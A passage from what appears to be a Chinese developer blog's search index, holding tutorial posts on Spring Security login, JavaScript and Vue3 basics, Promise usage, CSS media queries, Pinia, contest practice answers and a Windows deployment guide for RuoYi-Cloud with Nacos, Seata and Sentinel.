的实现类\n@Servicepublic class UserDetailsServiceImpl implements UserDetailsService &#123;  @Resource  private UserMapper userMapper;  @Override  public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException &#123;    //查询用户信息    LambdaQueryWrapper&lt;User&gt; queryWrapper = new LambdaQueryWrapper&lt;&gt;();    queryWrapper.eq(User::getEmail, username);    User user = userMapper.selectOne(queryWrapper);    //如果没有查询到用户，就抛出异常    if (Objects.isNull(user)) &#123;      throw new BadCredentialsException(&quot;用户名或者密码错误！&quot;);    &#125;    //将数据封装成UserDetails    return new UserLogin(user);  &#125;&#125;\n编写自定义控制器\n@RestController@RequestMapping(&quot;/user&quot;)public class UserController &#123;  @Resource  private IUserService userService;  @PostMapping(&quot;/login&quot;)  public Map&lt;String, String&gt; login(@RequestBody @Validated User user) &#123;    return userService.login(user);  &#125;&#125;\n编写 userServiceImpl 实现类\npublic Map&lt;String, String&gt; login(User user) &#123;  // 进行用户认证，用邮箱作为用户名登陆  UsernamePasswordAuthenticationToken authenticationToken = new UsernamePasswordAuthenticationToken(user.getEmail(), user.getPassword());  Authentication authenticate = authenticationManager.authenticate(authenticationToken);  //通过了，生成jwt  UserLogin loginUser = (UserLogin) authenticate.getPrincipal();  // 可以选择存放在redis ......  Map&lt;String, String&gt; map = new HashMap&lt;&gt;();  // 将token返回给前端  map.put(&quot;token&quot;, token);  return map;&#125;","tags":["Spring","Spring security"]},{"title":"JS 用 Set 实现 交集、并集、差集","url":"/posts/4cafe26/","content":"let a = new Set([1, 2, 3]);let b = new Set([4, 3, 2]);// 交集let intersect = new Set([...a].filter(x =&gt; b.has(x)));// set &#123;2, 3&#125;// 并集let union = new Set([...a, ...b]);// Set &#123;1, 2, 3, 4&#125;// 差集let difference = new Set([...a].filter(x =&gt; !b.has(x)));// Set &#123;1&#125;","tags":["JavaScript"]},{"title":"JS DOM 创建与获取","url":"/posts/16e4e576/","content":"创建节点\n// 创建一个元素节点，参数为标签名ele.createElement(&quot;p&quot;)\n创建文本节点\n// 创建一个文本节点，参数为文本内容ele.createTextNode(&quot;文本内容&quot;)\n在元素内部的末尾添加节点\n// 在元素内部的末尾添加节点，参数为要添加的节点ele.appendChild(node)\n在元素内部的末尾添加内容或节点\n// args 参数可以是 DOM 节点、DOM 节点数组、HTML 字符串、文本字符串ele.append(...args)\n在元素内，将节点添加到指定节点之前，返回添加的子节点\n// 如果给定的节点已经存在于文档中， 会将其从当前位置移动到新位置。（也就是说，它会在附加到指定的新父节点之前自动从现有的父节点中移除。）这意味着一个节点不能同时存在于文档的两个位置。ele.insertBefore(newNode, node);\n删除节点\n// 删除 ele 节点，包括其子节点ele.remove()\n删除子节点\nele.removeChild(childNode);\n替换节点\nele.replaceChild(newNode, oldNode);\n克隆节点\n// 参数为 true，则执行深拷贝，复制节点及其子节点；参数为 false，则执行浅拷贝，只复制节点本身，不复制子节点。(默认为false)ele.cloneNode(deep);\n获取父节点\nele.parentNode\n找到最近的指定父节点\nele.closest(&quot;selector&quot;)\n获取节点\n// 获取元素节点，参数为id名ele.getElementById(&quot;id&quot;)// 获取元素节点，参数为class名ele.getElementsByClassName(&quot;class&quot;)// 获取元素节点，参数为标签名ele.getElementsByTagName(&quot;tag&quot;)// 获取元素节点，参数为任何选择器ele.querySelector(&quot;selector&quot;)// 获取元素节点，参数为任何选择器ele.querySelectorAll(&quot;selector&quot;)","tags":["JavaScript"]},{"title":"Vue3 定义和使用 Porps","url":"/posts/9245de08/","content":"&lt;template&gt;  &lt;div&gt;    &lt;h1&gt;&#123;&#123; title &#125;&#125;&lt;/h1&gt;    &lt;p&gt;&#123;&#123; description &#125;&#125;&lt;/p&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script setup&gt;import &#123; defineProps &#125; from &#x27;vue&#x27;// 定义 Props，在 setup 中props是自动解构的，不需要通过 props.title 来访问defineProps(&#123;  title: &#123;    // 定义 props 的数据类型    type: string,    // required 标明这个 prop 是必传的，属性是可选的，默认为 false，    required: true,    validator(value)&#123;      // 自定义校验函数，返回 true 表示校验通过，返回 false 表示校验失败      return [&#x27;success&#x27;, &#x27;warning&#x27;, &#x27;danger&#x27;].includes(value)    &#125;  &#125;,  description: &#123;    type: String,    // 为 prop 提供默认值    default: &#x27;Default description&#x27;  &#125;&#125;)&lt;/script&gt;\n","tags":["Vue3","Props"]},{"title":"JS 判断数据类型","url":"/posts/e001cad0/","content":"// typeof 操作符可以返回一个值的类型。对于对象（包括数组和 null），typeof 会返回 &quot;object&quot;，但它不能区分数组和对象，因此需要额外判断。typeof value// 返回 [object Type]，value可以是任意值Object.prototype.toString.call(value)// instanceof 运算符可以判断一个对象是否是某个构造函数的实例。如果需要判断一个对象是否是 Object 类型的实例，可以使用 instanceof Object。// 需要注意，instanceof 对数组和对象都会返回 true，因此需要 value !== null 排除 null。value instanceof Constructor","tags":["JavaScript"]},{"title":"Vue 计算属性 computed","url":"/posts/39f2161a/","content":"当 computed 内部的变量发生了变化，computed 会重新计算，并返回新的值。\n函数式写法\n&lt;!-- 可以通过模板语法直接使用 --&gt;&lt;template&gt;    &lt;div&gt;&#123;&#123; sum &#125;&#125;&lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;     computed:&#123;          sum()&#123;              return this.num1 + this.num2          &#125;    &#125;&#125;&lt;/script&gt;\nsetup 写法\n&lt;!-- 可以通过模板语法直接使用 --&gt;&lt;template&gt;    &lt;div&gt;&#123;&#123; sum &#125;&#125;&lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;     setup()&#123;          const num1 = ref(1)          const num2 = ref(1)          let sum = computed(()=&gt;&#123;              return num1.value + num2.value           &#125;)         return &#123;            sum        &#125;    &#125;&#125;&lt;/script&gt;\noptions 写法\n&lt;!-- 可以通过模板语法直接使用 --&gt;&lt;template&gt;    &lt;div&gt;&#123;&#123; sum &#125;&#125;&lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;     computed:&#123;         sum:&#123;              get()&#123;                 return this.num1 * this.num2            &#125;,            set(value)&#123;                 this.num1 = value / 2                 this.num2 = value / 3            &#125;          &#125;     &#125;&#125;&lt;/script&gt;","tags":["JavaScript","Vue3","Computed"]},{"title":"蓝桥杯 Web 练习","url":"/posts/17b3dfa8/","content":"拼接url参数 (简单)\n\n对函数参数相关词语进行规则匹配 (中等)\n// 假设生成的绘画数据数组为 artDataArrayconst artDataArray = [  &#123; &quot;imageUrl&quot;: &quot;images/img1.jpg&quot;, &quot;tags&quot;: &quot;知更鸟、湖蓝色、十分可爱、皮克斯渲染&quot; &#125;,  &#123; &quot;imageUrl&quot;: &quot;images/img2.jpg&quot;, &quot;tags&quot;: &quot;知更鸟、个性的眉毛、模糊毛皮&quot; &#125;,  &#123; &quot;imageUrl&quot;: &quot;images/img3.jpg&quot;, &quot;tags&quot;: &quot;知更鸟、剪纸风格、个性的眉毛&quot; &#125;,  &#123; &quot;imageUrl&quot;: &quot;images/img4.jpg&quot;, &quot;tags&quot;: &quot;知更鸟、油画、十分可爱、特殊的羽毛&quot; &#125;,  &#123; &quot;imageUrl&quot;: &quot;images/img5.jpg&quot;, &quot;tags&quot;: &quot;男性、卡通、书、桌子&quot; &#125;,  &#123; &quot;imageUrl&quot;: &quot;images/img6.jpg&quot;, &quot;tags&quot;: &quot;男性、卡通、玩具、眼镜&quot; &#125;,  &#123; &quot;imageUrl&quot;: &quot;images/img7.jpg&quot;, &quot;tags&quot;: &quot;男性、卡通、玩具&quot; &#125;,  &#123; &quot;imageUrl&quot;: &quot;images/img8.jpg&quot;, &quot;tags&quot;: &quot;男性、卡通、书&quot; &#125;,  &#123; &quot;imageUrl&quot;: &quot;images/img9.jpg&quot;, &quot;tags&quot;: &quot;沙滩、遮阳伞、散步&quot; &#125;,  &#123; &quot;imageUrl&quot;: &quot;images/img10.jpg&quot;, &quot;tags&quot;: &quot;沙滩、椰子树、一群人&quot; &#125;,  &#123; &quot;imageUrl&quot;: &quot;images/img11.jpg&quot;, &quot;tags&quot;: &quot;沙滩、遮阳伞、人、包&quot; &#125;,  &#123; &quot;imageUrl&quot;: &quot;images/img12.jpg&quot;, &quot;tags&quot;: &quot;沙滩、回忆、相框&quot; &#125;]/** * @param &#123;*&#125; imageCount 生成的图片数量 * @param &#123;*&#125; selectedText 用户输入的文本 */function generateAndDisplayImages(imageCount, selectedText) &#123;  let imgAry = [] // 定义最佳匹配的图片数组  // TODO：待补充代码   let arr = []  for (let i = 0; i &lt; artDataArray.length; i++) &#123;    const keyword = artDataArray[i].tags.split(&quot;、&quot;)    arr[i] = &#123;      count: 0,      data: artDataArray[i]    &#125;    for (let j = 0; j &lt; keyword.length; j++) &#123;      if(selectedText.indexOf(keyword[j]) != -1)        arr[i].count++    &#125;  &#125;  const sortArr = arr.sort((a,b)=&gt; b.count - a.count).slice(0,imageCount)  sortArr.map(item =&gt; imgAry.push(item.data))  //TODO：END  return imgAry;&#125;\n简易JSX解析器 (中等)\n/** * @param type 要渲染的元素类型，即标签名 * @param config 包含标签属性或事件函数的对象 */const jsx = (type, config) =&gt; &#123;  /* TODO: 待补充代码 */  console.log(type,config);  let dom = document.createElement(type)  if(Object.prototype.toString.call(config.children) === &#x27;[object String]&#x27;)&#123;    dom.innerHTML += config.children    &#125; else &#123;  for (let i = 0; i &lt; config.children.length; i++) &#123;   if(Object.prototype.toString.call(config.children[i]) === &#x27;[object String]&#x27;)&#123;    dom.innerHTML += config.children[i]   &#125;else&#123;    dom.appendChild(config.children[i])   &#125;  &#125; &#125; if(config[&#x27;style&#x27;] !== undefined)&#123;    const styleKeys = Object.keys(config[&#x27;style&#x27;])    for (const key of styleKeys) &#123;      dom.style[key] = config[&#x27;style&#x27;][key]    &#125;  &#125; const configKeys = Object.keys(config) for (const key of configKeys) &#123;    if(Object.prototype.toString.call(config[key]) === &#x27;[object Function]&#x27;)&#123;      dom[key] = config[key]    &#125; &#125; for (const key of configKeys) &#123;  if(key !== &#x27;children&#x27;)&#123;    if(Object.prototype.toString.call(config[key]) === &#x27;[object String]&#x27;)&#123;      dom.setAttribute(key,config[key])    &#125;  &#125;&#125; return dom&#125;\nGithub 明星项目统计\nconst changeHandle = () =&gt; &#123;    // TODO：待补充代码    const arr = []    if(language.value === &#x27;All&#x27;)        arr.push(...chartData.value)    else &#123;        arr.push(...chartData.value        .filter(item=&gt;item.language === language.value)        .sort((a,b)=&gt;b.stars - a.stars)        .slice(pageStart.value-1,pageEnd.value))    &#125;    xData.value = arr.map(item=&gt;item.name)    yData.value = arr.map(item=&gt;item.stars)    initChart();&#125;;\n小蓝驿站\nconst addContact = () =&gt; &#123;    // TODO：待补充代码 目标 2     const data = contacts.value.filter(item=&gt;item.letter === newContact.value[0].toUpperCase())    if(data.length === 0)&#123;        contacts.value.push(&#123;            contacts:[&#123;name:newContact.value&#125;],            letter:newContact.value[0].toUpperCase()        &#125;)    &#125;else&#123;        for (let i = 0; i &lt; contacts.value.length; i++) &#123;            if(contacts.value[i].letter === newContact.value[0].toUpperCase())&#123;                contacts.value[i].contacts.push(&#123;name:newContact.value&#125;)                break            &#125;        &#125;    &#125;    // TODO：END    // 添加完成清空联系人输入框    newContact.value = &quot;&quot;;&#125;;\n搜索重试\n/** * 定义一个重试函数 * @param &#123;func&#125; operation 要作用的函数 * @param &#123;number&#125; maxAttempts 最大重试次数 * @param &#123;number&#125; delayBetweenRetries 重试之间的时间间隔 * @returns */async function retry(operation, maxAttempts, delayBetweenRetries) &#123;  // TODO:待补充代码  let attempt = 0;  while (attempt &lt; maxAttempts) &#123;    try &#123;      // 尝试执行操作      return await operation(); // 如果成功，返回结果    &#125; catch (error) &#123;      attempt++; // 增加尝试次数      if (attempt &gt;= maxAttempts) &#123;        // return new Promise((res,rej)=&gt;rej(error))        throw error      &#125;      // 如果失败，等待指定的时间再重试      await new Promise(resolve =&gt; setTimeout(resolve, delayBetweenRetries));    &#125;  &#125;&#125;\n购物狂欢节\nasync function fetchProducts(category) &#123;  // TODO: 根据分类获取商品数据  products.value = []  const data = await fetch(`api/products/$&#123;category&#125;.json`)  .then(res=&gt;res.json())  for (let i = 0; i &lt; data.length; i++) &#123;    products.value.push(data[i])  &#125;&#125;const products = ref([]);function addProduct(product) &#123;  // TODO: 添加商品到购物车，如果商品已存在，则数量+1  if(products.value.some((e)=&gt;e.id === product.id))&#123;    for (let i = 0; i &lt; products.value.length; i++) &#123;      if(products.value[i].id === product.id)&#123;        products.value[i].quantity += 1      &#125;    &#125;  &#125;else&#123;    product.quantity = 1    products.value.push(product)  &#125;&#125;const totalPrice = computed(() =&gt; &#123;  // TODO: 计算总价  return products.value.reduce((acc,item)=&gt;&#123;    return acc + item.price * item.quantity  &#125;,0)&#125;);\n","tags":["JavaScript","蓝桥杯"]},{"title":"JavaScript Promise 的使用","url":"/posts/da4c0519/","content":"Promise 的概念\n一个 Promise 必然处于以下几种状态之一：\n\n待定（pending）：初始状态，既没有被兑现，也没有被拒绝。\n已兑现（fulfilled）：意味着操作成功完成。可以用then方法来处理。\n已拒绝（rejected）：意味着操作失败。可以用catch方法来处理\n如果一个 Promise 已经被兑现或拒绝，即不再处于待定状态，那么则称之为已敲定（settled）。\n\n\nPromise 基本使用\nPromise 成功回调\nconst promise = new Promise((resolve, reject) =&gt; &#123;    // 模拟异步操作    setTimeout(() =&gt; &#123;        resolve(&#x27;成功&#x27;);    &#125;,1000)&#125;);\nPromise 失败回调\nconst promise = new Promise((resolve, reject) =&gt; &#123;    // 模拟异步操作    setTimeout(() =&gt; &#123;        reject(&#x27;失败&#x27;);    &#125;,1000)&#125;);\nPromise then 方法\nthen 方法用于指定当 Promise 对象状态变为已兑现（fulfilled）时，所执行的操作。\nconst promise = new Promise((resolve, reject) =&gt; &#123;    // 模拟异步操作    setTimeout(() =&gt; &#123;        resolve(&#x27;成功&#x27;);    &#125;,1000)&#125;);promise.then((res) =&gt; &#123;    console.log(res);&#125;);\nPromise catch 方法\ncatch 方法用于指定当 Promise 对象状态变为已拒绝（rejected）时，所执行的操作。\nconst promise = new Promise((resolve, reject) =&gt; &#123;    // 模拟异步操作    setTimeout(() =&gt; &#123;        reject(&#x27;失败&#x27;);    &#125;,1000)&#125;);promise.catch((err) =&gt; &#123;    console.log(err);&#125;);\nPromise finally 方法\nfinally 方法用于指定不管 Promise 对象最后状态如何，都会执行的操作。\nconst promise = new Promise((resolve, reject) =&gt; &#123;    // 模拟异步操作    setTimeout(() =&gt; &#123;        resolve(&#x27;成功&#x27;);    &#125;,1000)&#125;);promise.finally(() =&gt; &#123;    console.log(&#x27;finally&#x27;);&#125;)\nPromise 并发和静态方法\nPromise 类提供了四个静态方法来促进异步任务的并发：\n所有这些方法都接受一个 Promise（确切地说是 thenable）的可迭代对象，并返回一个新的 Promise。它们都支持子类化，这意味着它们可以在 Promise 的子类上调用，结果将是一个属于子类类型的 Promise。为此，子类的构造函数必须实现与 Promise() 构造函数相同的签名——接受一个以 resolve 和 reject 回调函数作为参数的单个 executor 函数。子类还必须有一个 resolve 静态方法，可以像 Promise.resolve() 一样调用，以将值解析为 Promise。\n请注意，JavaScript 的本质上是单线程的，因此在任何时刻，只有一个任务会被执行，尽管控制权可以在不同的 Promise 之间切换，从而使 Promise 的执行看起来是并发的。在 JavaScript 中，并行执行只能通过 worker 线程实现。\nPromise.all()\n仅在 ​所有传入的 Promise 都变为 fulfilled（成功）​​ 时才会返回结果数组。若其中​任意一个 Promise 变为 rejected（失败）​，则立即以该失败原因拒绝。\n示例：\n// 当所有 Promise 成功时，返回的数组 ​严格按传入顺序排列结果，与完成先后无关：Promise.all([  Promise.resolve(1),  Promise.resolve(2),  Promise.resolve(3)]).then(console.log); // 输出 [1, 2, 3]// 只要有一个 Promise 失败，立即终止并返回 ​首个遇到的错误：Promise.all([  Promise.resolve(1),  Promise.reject(&#x27;error&#x27;),  Promise.resolve(3) // 此结果不会被处理]).catch(console.log); // 输出 &quot;error&quot;\nPromise.allSettled()\n在所有的 Promise 都被敲定时兑现。\n示例:\nconst p1 = Promise.resolve(&#x27;A&#x27;);const p2 = Promise.reject(&#x27;Error in B&#x27;);const p3 = new Promise(resolve =&gt; setTimeout(resolve, 50, &#x27;C&#x27;));Promise.allSettled([p1, p2, p3])  .then(results =&gt; &#123;    console.log(results);    /* 输出：    [      &#123; status: &#x27;fulfilled&#x27;, value: &#x27;A&#x27; &#125;,      &#123; status: &#x27;rejected&#x27;, reason: &#x27;Error in B&#x27; &#125;,      &#123; status: &#x27;fulfilled&#x27;, value: &#x27;C&#x27; &#125;    ]    */  &#125;);\nPromise.any()\n只要传入的 Promise 列表中 ​有任意一个变为 fulfilled（成功）​，Promise.any() 就会立即 ​返回该成功值，并忽略其他所有 Promise 的结果（无论其他 Promise 是成功还是失败）。仅在所有传入的 Promise 都变为 rejected（失败）时，才会返回一个被拒绝的 Promise，并返回该拒绝原因。\n示例：\n// 示例1：第一个成功值被返回Promise.any([  Promise.reject(&#x27;error1&#x27;),  Promise.resolve(&#x27;success&#x27;),  Promise.reject(&#x27;error2&#x27;)]).then(console.log); // 输出 &quot;success&quot;\nPromise.race()\n返回的 Promise 状态由​最先敲定（无论是 fulfilled 还是 rejected）​​ 的 Promise 决定，且 ​立即传递其值或原因。一旦首个 Promise 敲定，其他 Promise 的结果将被完全忽略，即使后续有其他 Promise 完成。\n示例：\n// 第一个完成的 Promise 是成功const fastSuccess = Promise.resolve(&#x27;成功&#x27;);const slowError = new Promise((_, reject) =&gt;   setTimeout(reject, 100, &#x27;超时错误&#x27;));Promise.race([fastSuccess, slowError])  .then(result =&gt; console.log(&#x27;结果:&#x27;, result)) // 输出 &quot;结果: 成功&quot;  .catch(error =&gt; console.log(&#x27;错误:&#x27;, error));// 第一个完成的 Promise 是失败const fastError = Promise.reject(&#x27;请求失败&#x27;);const slowSuccess = new Promise(resolve =&gt;   setTimeout(resolve, 100, &#x27;延迟成功&#x27;));Promise.race([fastError, slowSuccess])  .then(result =&gt; console.log(&#x27;结果:&#x27;, result))  .catch(error =&gt; console.log(&#x27;错误:&#x27;, error)); // 输出 &quot;错误: 请求失败&quot;\nPromise.resolve()\n返回一个新的 Promise 对象，该对象以给定的值兑现。如果值是一个 thenable 对象（即具有 then 方法），则返回的 Promise 对象会“跟随”该 thenable 对象，采用其最终的状态；否则，返回的 Promise 对象会以该值兑现。\nPromise.reject()\n返回一个新的 Promise 对象，该对象以给定的原因拒绝。\n","tags":["JavaScript","Promise"]},{"title":"CSS 媒体查询","url":"/posts/3106d1e6/","content":"媒体类型（Media Type）​\nscreen（屏幕）\nprint（打印）\nall（全部设备）\n​媒体特性条件（Media Feature）\n必须用括号包裹，如 (min-width: 900px)\n基本语法\n@media 媒体类型 and (媒体特性条件) &#123;  /* 样式规则 */&#125;\n示例\n/* 单条件 *//* 屏幕设备且宽度≥900px 时生效 */@media screen and (min-width: 900px) &#123;  article &#123; padding: 1rem 3rem; &#125;&#125;/* 多条件 *//* 屏幕设备、宽度≥900px 且横屏时生效 */@media screen and (min-width: 900px) and (orientation: landscape) &#123;  article &#123; padding: 2rem; &#125;&#125;/* 等效于 @media all and (min-width: 900px) */@media (min-width: 900px) &#123;  article &#123; padding: 1rem 3rem; &#125;&#125;/* 使用 ,（逗号）表示 ​逻辑或（OR） *//* 屏幕设备且宽度≥900px，或打印设备时生效 */@media screen and (min-width: 900px), print &#123;  article &#123; padding: 1rem 3rem; &#125;&#125;","tags":["CSS","媒体查询","media"]},{"title":"Vue3 和 Pinia 的使用","url":"/posts/ffa41da9/","content":"Vue3 创建实例\n使用 setup\nconst &#123; createApp &#125; = VuecreateApp(&#123;    setup() &#123;        // ...    &#125;&#125;).mount(&#x27;#app&#x27;) // 挂载到 #app\n使用 Options API\nconst &#123; createApp &#125; = VuecreateApp(&#123;    data() &#123;        return &#123;&#125;    &#125;,    methods: &#123;&#125;,    // ...    &#125;).mount(&#x27;#app&#x27;) // 挂载到 #app\nPinia 定义 Store\ndefineStore 的第一个参数是 store 的 id，必须是唯一的。第二个参数是一个选项对象。\n使用 Setup Store\nconst &#123; ref &#125; = Vueconst &#123; defineStore &#125; = Piniaconst useTestStore = defineStore(&#x27;test&#x27;, () =&gt; &#123;    const count = ref(1)    const doubleCount = computed(() =&gt; count.value * 2)    const increment = () =&gt; &#123;        count.value++    &#125;    return &#123; count, doubleCount, increment &#125;&#125;)\n使用 Option Store\nconst &#123; defineStore &#125; = Piniaconst useTestStore = defineStore(&#x27;test&#x27;, &#123;    // 状态数据    state: () =&gt; (&#123;        count: 1    &#125;),    // 计算属性    getters: &#123;        doubleCount: (state) =&gt; state.count * 2    &#125;,    // 方法    actions: &#123;        increment() &#123;            this.count++        &#125;    &#125;&#125;)\nVue3 使用 Pinia\nconst &#123; createApp, ref &#125; = Vueconst &#123; createPinia &#125; = Pinia// 定义 Storeconst useTestStore = defineStore(&#x27;test&#x27;, () =&gt; &#123;    const count = ref(1)    const doubleCount = computed(() =&gt; count.value * 2)    const increment = () =&gt; &#123;        count.value++    &#125;    return &#123; count, doubleCount, increment &#125;&#125;)\n// Options APIcreateApp(&#123;    data() &#123;        return &#123;            testStore: useTestStore()        &#125;    &#125;&#125;)// 使用 Pinia.use(createPinia()).mount(&#x27;#app&#x27;)\n// SetupcreateApp(&#123;    setup()&#123;        const testStore = useTestStore()        return &#123; testStore &#125;    &#125;&#125;)// 使用 Pinia.use(createPinia()).mount(&#x27;#app&#x27;)\n&lt;!-- 显示 --&gt;&lt;div id=&quot;app&quot;&gt;    &#123;&#123; testStore.count &#125;&#125;    &#123;&#123; testStore.doubleCount &#125;&#125;    &lt;button @click=&quot;testStore.increment&quot;&gt;按钮&lt;/button&gt;&lt;/div&gt;","tags":["Vue3","Pinia"]},{"title":"Win10 部署若依微服务版本","url":"/posts/5a3cd46b/","content":"环境部署\n\n开发和生产都是此环境\n\nJDK &gt;= 1.8 (推荐1.8版本)Mysql &gt;= 5.7.0 (推荐5.7版本)Redis &gt;= 3.0Maven &gt;= 3.0Node &gt;= 12nacos &gt;= 2.0.4 (ruoyi-cloud &lt; 3.0 需要下载nacos &gt;= 1.4.x版本)sentinel &gt;= 1.6.0\n下载\n\n下载的任何文件都建议放在不包含中文的目录下\n\n下载项目\n项目链接: https://gitee.com/y_project/RuoYi-Cloud\n或使用git拉取\ngit clone https://gitee.com/y_project/RuoYi-Cloud.git\n下载 nacos\n官方下载: https://nacos.io/download/nacos-server/\n下载 seata-server\n官方下载: https://nacos.io/download/nacos-server/\n下载 redis\n这里用的是7.4.2版本\n官方下载: https://redis.io/downloads/\n下载 MySQL,Nginx\n这里用的是小皮面板，可以集成 Nginx,MySQL,FTP等服务,这里只用到了MySQL和Nginx\n官方下载: https://www.xp.cn/php-study\n下载 Java\n这里用的是jdk21\nhttps://bell-sw.com/pages/downloads/\n下载 sentinel\n下载后放到Ruoyi-Cloud的jars文件夹(自建)内,此处用的是1.8.8版本\nhttps://github.com/alibaba/Sentinel/releases\n开发环境部署\n个人习惯将后端和前端分开，解压项目后将Ruoyi-Cloud文件夹重命名为ruoyi-master，将ruoyi-master内的ruoyi-ui跟ruoyi-master放到同级目录。\n建议使用默认端口，放行8848,9848,7848,9849\n配置 Java 环境\n解压 jdk-21_windows-x64_bin.zip 到不包含中文的目录下\n打开环境变量\n\n\n添加JAVA_HOME变量\n\n点开Path变量\n\n配置到bin目录\n\n验证环境是否配置成功\n\n部署 nacos\n解压 nacos-server-2.5.1.tar.gz 到不包含中文的目录下\n配置\n编辑 nacos/bin/startup.cmd，修改 cluster 为 standalone\nstandalone 是单机部署 ， cluster 是集群部署\n\n将ruoyi-master/docker/nacos/conf/application.properties文件复制到nacos/conf/application.properties，并打开nacos/conf/application.properties修改\nspring.datasource.platform=mysqldb.num=1db.url.0=jdbc:mysql://mysql-host:3306/ry-config?characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=true&amp;useUnicode=true&amp;useSSL=false&amp;serverTimezone=UTCdb.user=rootdb.password=passwordnacos.naming.empty-service.auto-clean=truenacos.naming.empty-service.clean.initial-delay-ms=50000nacos.naming.empty-service.clean.period-time-ms=30000management.endpoints.web.exposure.include=*management.metrics.export.elastic.enabled=falsemanagement.metrics.export.influx.enabled=falseserver.tomcat.accesslog.enabled=trueserver.tomcat.accesslog.pattern=%h %l %u %t &quot;%r&quot; %s %b %D %&#123;User-Agent&#125;i %&#123;Request-Source&#125;iserver.tomcat.basedir=D://home/ruoyi/nacos/tomcat/logsnacos.security.ignore.urls=/,/error,/**/*.css,/**/*.js,/**/*.html,/**/*.map,/**/*.svg,/**/*.png,/**/*.ico,/console-ui/public/**,/v1/auth/**,/v1/console/health/**,/actuator/**,/v1/console/server/**nacos.core.auth.system.type=nacos# 开启认证nacos.core.auth.enabled=truenacos.core.auth.default.token.expire.seconds=18000# 此字段将 nacos.core.auth.default.token.secret.key 做替换，值为base64编码后字符串长度&gt;=32的字符串nacos.core.auth.plugin.nacos.token.secret.key=6L+Z5piv5L2g55qE6ZW/5bqmPj0zMueahGJhc2U2NOe8lueggQ==nacos.core.auth.caching.enabled=truenacos.core.auth.enable.userAgentAuthWhite=falsenacos.core.auth.server.identity.key=serverIdentitynacos.core.auth.server.identity.value=securitynacos.istio.mcp.server.enabled=false\n启动 nacos\n双击或命令行运行 nacos/bin/startup.cmd\n如果出现类似于这样的错误，删除startup.cmd内所有的rem行即可。\n\n运行成功类似于下图\n\n部署 seata-server\n解压 apache-seata-2.3.0-incubating-bin.tar.gz 到不包含中文的目录下\n配置seata-server\n编辑 seata-server/conf/application.yml\nserver:  port: 7091spring:  application:    name: seata-serverlogging:  config: classpath:logback-spring.xml  file:    path: $&#123;log.home:$&#123;user.home&#125;/logs/seata&#125;  extend:    logstash-appender:      destination: 127.0.0.1:4560    kafka-appender:      bootstrap-servers: 127.0.0.1:9092      topic: logback_to_logstashconsole:  user:    username: seata    password: seataseata:  config:    # support: nacos, consul, apollo, zk, etcd3    type: nacos    nacos:      server-addr: 127.0.0.1:8848  # nacos地址      group: SEATA_GROUP  # 配置文件的分组      username: nacos  # nacos用户名      password: nacos  # nacos密码      # 这是默认值      data-id: seata.properties  # 配置文件的data id也就是配置文件名加后缀  registry:    # support: nacos, eureka, redis, zk, consul, etcd3, sofa    type: nacos    nacos:      application: seata-server   #seata启动后在nacos的服务名      server-addr: 127.0.0.1:8848  # nacos地址      group: SEATA_GROUP  # 配置文件的分组      cluster: default  # 这个歌参数在每个微服务seata时会用到      username: nacos  # nacos用户名      password: nacos  # nacos密码  store:    # support: file 、 db 、 redis    mode: db  #  server:  #    service-port: 8091 #If not configured, the default is &#x27;$&#123;server.port&#125; + 1000&#x27;  security:  # 此处的secretKey是nacos的 nacos.core.auth.plugin.nacos.token.secret.key    secretKey: 6L+Z5piv5L2g55qE6ZW/5bqmPj0zMueahGJhc2U2NOe8lueggQ==    tokenValidityInMilliseconds: 1800000    csrf-ignore-urls: /metadata/v1/**    ignore:      urls: /,/**/*.css,/**/*.js,/**/*.html,/**/*.map,/**/*.svg,/**/*.png,/**/*.jpeg,/**/*.ico,/api/v1/auth/login,/version.json,/health,/error,/vgroup/v1/**\n运行 seata-server\nseata-server/bin/seata-server.bat\n运行成功类似于下图\n\n部署 redis\n解压 redis-7.4.2.zip 到不包含中文的目录下\n配置 redis\n如果不设置密码可以忽略配置\n编辑 redis.conf\n找到或添加配置 requirepass\nrequirepass 密码\n运行 redis\n运行成功类似于下图\n\n部署 mysql\n打开小皮面板，安装成功后如下图\n\n修改数据库密码\n\n启动mysql\n\n配置 若依数据库\n用可视化工具或命令行创建ry-cloud,ry-config,ry-seata三个库，数据库编码用utf8_general_ci\nry-cloud 导入 ruoyi-master/sql/ry_2025xxxx.sql (必须),ruoyi-master/sql/quartz.sql(可选)\nry-config 导入 ruoyi-master/sql/ry_config_2025xxxx.sql（必须）\nry-seata 导入 ruoyi-master/sql/ry_seata_2025xxxx.sql\n运行 sentinel\ncmd进入ruoyi-master/jars目录，运行以下命令\njava -Dserver.port=8718 -Dcsp.sentinel.dashboard.server=localhost:8718 -Dproject.name=sentinel-dashboard -Dcsp.sentinel.api.port=8719 -jar sentinel-dashboard-1.8.8.jar\n后端运行\n配置\n根据图片修改模块的配置\n\n# Tomcatserver:   port: 9200# Springspring:  application:    # 应用名称    name: ruoyi-auth  profiles:    # 环境配置    active: dev  cloud:    nacos:      discovery:        # 服务注册地址        server-addr: 127.0.0.1:8848        username: nacos        password: nacos # nacos 密码      config:        # 配置中心地址        server-addr: 127.0.0.1:8848        # 配置文件格式        file-extension: yml        # 共享配置        shared-configs:          - application-$&#123;spring.profiles.active&#125;.$&#123;spring.cloud.nacos.config.file-extension&#125;        username: nacos        password: nacos # nacos 密码\n网关端口就是前端所请求的端口\n\n# Tomcatserver:  port: 3000# Springspring:   application:    # 应用名称    name: ruoyi-gateway  profiles:    # 环境配置    active: dev  cloud:    nacos:      discovery:        # 服务注册地址        server-addr: 127.0.0.1:8848        username: nacos        password: nacos # nacos 密码      config:        # 配置中心地址        server-addr: 127.0.0.1:8848        # 配置文件格式        file-extension: yml        # 共享配置        shared-configs:          - application-$&#123;spring.profiles.active&#125;.$&#123;spring.cloud.nacos.config.file-extension&#125;        username: nacos        password: nacos # nacos 密码    sentinel:      # 取消控制台懒加载      eager: true      transport:        # 控制台地址        dashboard: 127.0.0.1:8718      # nacos配置持久化      datasource:        ds1:          nacos:            server-addr: 127.0.0.1:8848            dataId: sentinel-ruoyi-gateway            groupId: DEFAULT_GROUP            data-type: json            rule-type: gw-flow\n\n# Tomcatserver:  port: 9300# Springspring:   application:    # 应用名称    name: ruoyi-file  profiles:    # 环境配置    active: dev  cloud:    nacos:      discovery:        # 服务注册地址        